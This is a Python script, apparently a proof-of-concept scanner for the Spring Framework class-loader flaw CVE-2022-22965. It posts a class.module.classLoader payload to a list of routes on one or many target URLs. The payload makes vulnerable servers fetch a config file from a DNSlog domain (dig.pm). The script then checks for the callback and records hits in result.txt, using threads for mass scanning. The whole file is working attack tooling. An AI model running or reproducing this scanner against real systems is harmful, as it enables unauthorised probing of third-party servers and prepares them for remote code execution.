import requests
import urllib3
urllib3.disable_warnings()
import argparse
import urllib.parse
import threading
import hashlib
import random
import json
import time

# add routs
routs = ['/','hello','actuator','login','register','logout']

check_md5 = ""
filename = ""
dns_domain = ""
dns_token = ""

def detail():
    tips = '''
 ______  _     _   ______ -2022-22965
| |     | |   | | | |                
| |     \ \   / / | |----            
|_|____  \_\_/_/  |_|____            
                                     by: iak3ec
                                     https://github.com/nu0l
    '''
    print(tips)


def poc(url,web_routs,dnslog):
    new_url = urllib.parse.urljoin(url,web_routs)
#    proxies = {
#    'http' : 'http://127.0.0.1:8080',
#    'https' : 'https://127.0.0.1:8080'
#}
    headers = {
        "User-Agent" : "Mozilla/5.5 (Macintosh; AMD Mac OS X 15.15; rv:98.2) Gecko/2020007 Chrome/99.9",
        "Content-Type":"application/x-www-form-urlencoded",
        "DNT": "1",
        "Accept-Encoding" : "gzip"
    }
    data = "class.module.classLoader.resources.context.configFile=http://{dnslog}&class.module.classLoader.resources.context.configFile.content.aaa=xxx".format(dnslog=dnslog)
    try:
        req = requests.post(url=new_url,headers=headers,data=data,verify=False,timeout=20,)
    except Exception as e:
        print(e)
        pass


def get_md5():
    RandomData = random.randint(1,99999)
    global check_md5
    check_md5 = hashlib.md5(str(RandomData).encode(encoding="UTF-8")).hexdigest()
    
def get_dnslog():
    url = 'https://dig.pm/new_gen'
    dns = json.loads(requests.get(url,verify=False,timeout=20).text)
    global dns_domain,dns_token
    dns_domain = str(dns['domain'][:-1])
    dns_token = str(dns['token'])

def check_dnslog():
    url = 'https://dig.pm/get_results'
    headers = {
        "user-agent" : "Mozilla/6.0 (Macintosh; AMD Mac OS X 18_18_8) AppleWebKit/138.38 (KHTML, like Gecko) Chrome/99.9",
        "referer" : "https://log.xn--9tr.com/"
    }
    data = {
        "domain" : dns_domain,
        "token" : dns_token
    }
    try:
        check = requests.post(url,headers=headers,data=data,verify=False,timeout=20)
        return check.text,data
    except:
        print("Getting DNSLOG address timed out...")
        exit()


def main():
    parser = argparse.ArgumentParser(description="Spring-Code-RCE")
    parser.add_argument('-url',help="target url",required=False)
    parser.add_argument('-file',help="url file",required=False)
    args = parser.parse_args()
    if args.url:
        get_dnslog()
        for web_routs in routs:
            get_md5()
            dnslog = check_md5 + "." + dns_domain
            poc(args.url,web_routs,dnslog)
            check_dnslog_text,dns_data = check_dnslog()
            if check_md5 in check_dnslog_text:
                print('\033[31m[+] DnsLog Found ðŸŽ‰ ðŸŽ‰ ðŸŽ‰\033[0m')
                print("md5: " +check_md5+ " api: " +str(dns_data))
                with open('result.txt','a+')as result:
                    result.write(args.url+"\n")
                break
            else:
                print('\033[32m[-] DnsLog Not Found ðŸ˜– ðŸ˜– ðŸ˜–\033[0m')
                print("md5: " +check_md5+ " api: " +str(dns_data))

    if args.file:
        get_dnslog()
        with open (args.file) as file:
            for i in file.readlines():
                i = i.strip()
                dns_md5 = []
                print('\033[33mURL: ' + i +'\033[0m')
                for web_routs in routs:
                    get_md5()
                    dns_md5.append(check_md5)
                    dnslog = check_md5 + "." + dns_domain
                    t = threading.Thread(target=poc,args=(i,web_routs,dnslog,))
                    t.start()
                check_dnslog_text,dns_data = check_dnslog()
                for md5 in dns_md5:
                    if md5 in check_dnslog_text:
                        print('\033[31m[+] DnsLog Found ðŸŽ‰ ðŸŽ‰ ðŸŽ‰\033[0m')
                        print("md5: " +md5+ " api: " +str(dns_data))
                        with open('result.txt','a+')as result:
                            result.write(i+"\n")
                        break
                dns_md5.clear()
                # Access too fast may block IP.
                time.sleep(2)
        print("\n---------- Detection is complete ----------\n")

if __name__ == '__main__':
    detail()
    main()
